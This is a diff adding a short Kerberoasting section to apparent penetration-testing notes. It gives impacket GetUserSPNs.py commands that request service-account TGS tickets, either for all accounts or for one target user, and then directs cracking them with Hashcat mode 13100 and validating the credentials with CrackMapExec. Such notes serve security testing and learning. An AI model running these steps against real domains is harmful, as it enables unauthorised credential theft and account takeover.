@@ -24,3 +24,19 @@ The attack can be performed from multiple places:
 - From a domain-joined Windows host with a shell in the context of a domain account
 - As `SYSTEM` on a domain-joined Windows host
 - From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) `/netonly`
+
+### Kerberoasting with GetUserSPNs.py
+`GetUserSPNs.py` is an [impacket toolkit](https://github.com/SecureAuthCorp/impacket) script for working with SPNs.
+#### Request TGS tickets for SPN accounts
+```bash
+# Requests from all accounts
+GetUserSPNs.py -dc-ip [ip] [domain]/[user] -request -outputfile all_accounts_tgs
+
+# Requests from a single account
+GetUserSPNs.py -dc-ip [ip] [domain]/[user] -request-user [target-user]
+```
+> The output will be in format for [[Hashcat]] - mode: 13100
+> We can then use a tool like [[CrackMapExec]] to validate the account credentials once cracked.
+
+
+
